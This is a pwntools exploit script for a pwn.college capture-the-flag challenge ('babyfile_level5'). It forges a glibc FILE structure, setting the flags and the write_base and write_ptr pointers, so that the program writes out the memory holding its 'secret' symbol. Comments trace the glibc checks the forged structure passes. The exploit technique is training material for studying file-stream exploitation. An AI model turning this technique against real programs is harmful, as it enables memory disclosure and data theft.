from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level5")
libc=e.libc
gs="""
set listsize 50
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
b *0x00000000040188C
"""
_IO_EOF_SEEN=0x0010
_IO_NO_READS=0x0004
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
_IO_IN_BACKUP=0x0100
_IO_FLAGS2_NOTCANCEL=2
_IO_MAGIC=0xFBAD0000 
_IO_MAGIC_MASK=0xFFFF0000
_IO_LINE_BUF=0x0200
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        #pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level5")
sleep(1)
p.recvuntil(b"fp -> 0x")
fp=int(p.recvuntil(b"\n").rstrip().decode(),16)
p.sendafter(b"Now reading from stdin directly to the FILE struct.",
               p64( _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING)+#flags
               #pass if (fp->_flags & _IO_IS_APPENDING) // new_do_write 
               p64(0)+p64(e.sym.secret)+p64(0)+ # read_ptr, read_end, read_base
               p64(e.sym.secret)+p64(e.sym.secret+100)+p64(e.sym.secret+101) #write_base,write_ptr,write_end
               #make count >0 and count < to_do (=43)
               #pass ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL) // _IO_new_file_overflow 
               #==> call _IO_do_write (f, f->_IO_write_base, f->_IO_write_ptr - f->_IO_write_base);
)
p.interactive()